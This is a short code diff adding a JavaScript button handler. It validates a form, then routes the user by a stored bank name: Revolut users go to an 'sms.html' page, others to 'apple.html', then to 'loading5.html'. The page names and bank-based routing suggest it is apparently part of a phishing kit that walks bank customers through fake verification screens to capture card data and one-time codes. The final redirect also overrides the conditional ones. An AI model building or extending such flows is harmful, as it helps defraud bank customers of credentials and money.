@@ -1,0 +1,24 @@
+btn.addEventListener("click", async () => {
+  showErrors = true;
+  const ok = validateAll();
+  if(!ok){
+    const firstInvalid = document.querySelector("input.invalid");
+    if(firstInvalid) firstInvalid.focus();
+    return;
+  }
+
+
+const bankName = (sessionStorage.getItem("bank_name") || "")
+    .toLowerCase()
+    .trim();
+
+  const isRevolut =
+    bankName.includes("revolut");
+
+  if (isRevolut) {
+    window.location.href = "sms.html";
+  } else {
+    window.location.href = "apple.html";
+  }
+  window.location.href = "loading5.html";
+});
